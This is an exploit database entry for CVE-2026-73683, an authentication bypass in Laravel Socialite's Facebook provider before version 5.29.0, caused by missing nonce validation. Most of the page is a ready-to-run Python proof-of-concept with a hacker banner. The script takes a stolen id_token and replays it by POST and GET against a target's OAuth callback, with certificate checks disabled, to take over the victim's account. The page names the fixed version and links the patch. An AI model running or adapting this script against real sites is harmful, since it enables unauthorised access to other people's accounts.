---
title: Laravel Socialite <  5.29.0 - Facebook OIDC Nonce Replay Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2026080013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-21
fetch_date: 2026-08-22T02:50:37.906157
---

# Laravel Socialite <  5.29.0 - Facebook OIDC Nonce Replay Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Laravel Socialite < 5.29.0 - Facebook OIDC Nonce Replay Authentication Bypass** **2026.08.21**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-73683](https://cxsecurity.com/cveshow/CVE-2026-73683/ "Click to see CVE-2026-73683")**  CWE: **[CWE-294](https://cxsecurity.com/cwe/CWE-294 "Click to see CWE-294")** | |

#!/usr/bin/env python3
# Exploit Title: Laravel Socialite < 5.29.0 - Facebook OIDC Nonce Replay Authentication Bypass
# CVE: CVE-2026-73683
# Date: 2026-08-15
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/laravel/socialite
# Software Link: https://github.com/laravel/socialite
# Affected: Laravel Socialite < 5.29.0
# Tested on: Linux
# Category: WebApps
# Platform: PHP
# Exploit Type: Remote
# CVSS: 9.2 (Critical)
# CWE: CWE-294
# Description: Laravel Socialite Facebook provider does not validate the nonce claim on Limited Login OIDC id\_tokens. An attacker who obtains a valid, unexpired id\_token for the same Facebook App ID can replay it via userFromToken() and gain unauthorized access to the victim account.
# Fixed in: 5.29.0 (commit caf714f)
# Usage:
# python3 exploit.py <target\_url> <stolen\_id\_token>
#
# Example:
# python3 exploit.py https://target.com/auth/facebook/callback eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
import requests
import sys
import json
import base64
import urllib3
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪ ▀▄.▀· ▐█ ▀ ▪ •██ ▪ ▀▄ █· ▐█ ▀█ ▐█ ▄█ •██ ▀▀▄.▀· ▀▄ █· █▪██▌ ║
║ ▐█▀▀█▄ ▐▀▀▪▄ ▄█ ▀█▄ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪ ▐▀▀▪▄ ▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█ ▐█▄▄▌ ▐█▄▪▐█ ▐█▌· ▐█▌.▐▌ ▐█•█▌ ▐█ ▪▐▌ ▐█▪·• ▐█▌· ▐█▄▄▌ ▐█•█▌ ▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪ .▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-73683 • Laravel Socialite → Facebook Nonce Replay Auth Bypass ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
def decode\_jwt\_payload(token):
try:
parts = token.split('.')
if len(parts) != 3:
return None
payload = parts[1]
payload += '=' \* (-len(payload) % 4)
decoded = base64.urlsafe\_b64decode(payload)
return json.loads(decoded)
except Exception:
return None
def exploit(target\_url, id\_token):
target\_url = target\_url.rstrip('/')
print(f"[\*] Target : {target\_url}")
print(f"[\*] Stolen id\_token : {id\_token[:50]}...")
payload = decode\_jwt\_payload(id\_token)
if payload:
print("\n[\*] Decoded token claims:")
print(f" iss : {payload.get('iss')}")
print(f" aud : {payload.get('aud')}")
print(f" sub : {payload.get('sub')}")
print(f" email : {payload.get('email')}")
print(f" nonce : {payload.get('nonce', 'NOT PRESENT')}")
print(f" exp : {payload.get('exp')}")
else:
print("[-] Failed to decode JWT payload (token may be invalid)")
print("\n[\*] Attempting to replay the token (no nonce supplied)...")
# Common patterns used by applications that call userFromToken()
# Adjust the endpoint / parameter name according to the target application
data = {
"access\_token": id\_token, # some apps use this
"token": id\_token, # others use this
"id\_token": id\_token, # Limited Login style
}
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
"Accept": "application/json, text/html",
"Content-Type": "application/x-www-form-urlencoded",
}
try:
# Try POST first
r = requests.post(target\_url, data=data, headers=headers, timeout=12, verify=False, allow\_redirects=True)
print(f"[\*] POST → HTTP {r.status\_code}")
print(f"[\*] Response length: {len(r.text)} bytes")
if r.status\_code in (200, 302) and ("user" in r.text.lower() or "dashboard" in r.text.lower() or "welcome" in r.text.lower() or r.history):
print("[+] Possible successful authentication bypass (check session / response)")
else:
print("[-] No clear success indicator. Target may require different parameter or endpoint.")
# Also try GET (some implementations accept token in query)
r2 = requests.get(target\_url, params={"token": id\_token}, headers=headers, timeout=12, verify=False, allow\_redirects=True)
print(f"[\*] GET → HTTP {r2.status\_code}")
except Exception as e:
print(f"[-] Request failed: {e}")
print("\n[!] Note:")
print(" This PoC demonstrates the replay. Full success depends on the target")
print(" application calling Socialite::driver('facebook')->userFromToken()")
print(" without supplying / validating the expected nonce.")
print(" Before Socialite 5.29.0 the token is accepted → account takeover.")
if \_\_name\_\_ == "\_\_main\_\_":
banner()
if len(sys.argv) < 3:
print(f"Usage: {sys.argv[0]} <target\_url> <stolen\_facebook\_id\_token>")
print("Example:")
print(f" {sys.argv[0]} https://vulnerable-app.com/auth/facebook/callback eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...")
sys.exit(1)
target = sys.argv[1]
token = sys.argv[2]
exploit(target, token)

**##### References:**

https://github.com/laravel/socialite/pull/789

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top